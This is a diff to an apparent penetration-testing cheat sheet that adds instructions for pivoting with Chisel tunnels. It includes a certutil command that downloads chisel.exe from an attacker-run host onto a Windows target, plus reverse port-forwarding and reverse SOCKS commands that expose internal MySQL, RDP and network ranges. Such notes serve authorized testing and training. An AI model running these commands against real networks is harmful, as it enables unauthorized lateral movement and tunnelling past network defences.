@@ -92,7 +92,84 @@ ssh -R [bind_addr:]port [user@]hostname
 Example: ssh -R 0.0.0.0:1080 user@192.168.2.61
 ```
 
-# 2. ProxyChains
+# 2. Chisel tunnels
+
+[Chisel](https://github.com/jpillora/chisel) is useful for Windows targets that does not have SSH
+
+## 2.1. Preparing chisel binaries
+
+Prepare server on Kali:
+
+```console
+curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_1.7.7_linux_amd64 chisel
+chmod +x chisel
+```
+
+Prepare client binaries for Windows target to download
+
+```console
+curl -LO https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
+gzip -d chisel_1.7.7_windows_amd64.gz
+mv chisel_1.7.7_windows_amd64 /var/www/html/chisel.exe
+```
+
+Download client binaries on Windows target
+
+```console
+certutil.exe -urlcache -f -split http://kali.vx/chisel.exe %TEMP%\chisel.exe
+```
+
+## 2.2. Chisel server configuration
+
+#### Syntax
+
+```console
+chisel server --reverse --port <port>
+```
+
+#### Example
+
+```console
+chisel server --reverse --port 8080
+```
+
+## 2.3. Chisel Client configuration
+
+### 2.3.1. Reverse port forwarding
+
+#### Syntax
+
+```console
+chisel client <server> [R:[server-port]:[target-address]:[target-port]]
+```
+
+#### Example
+
+![image](images/chisel-reverse.png)
+
+```console
+chisel client 192.168.2.61:8080 R:13306:10.0.2.91:3306 R:13389:10.0.2.91:3389
+```
+
+## 2.3.2. Reverse SOCKS proxy
+
+#### Syntax
+
+```console
+chisel client <server> R:socks
+```
+
+#### Example
+
+![image](images/chisel-reverse-socks.png)
+
+```console
+chisel client 192.168.2.61:8080 R:socks
+```
+
+# 3. ProxyChains
 
 - Consider the reverse dynamic tunnel:
   - The accessing client `192.168.1.51` does not have a route to the `10.0.2.0/24` network
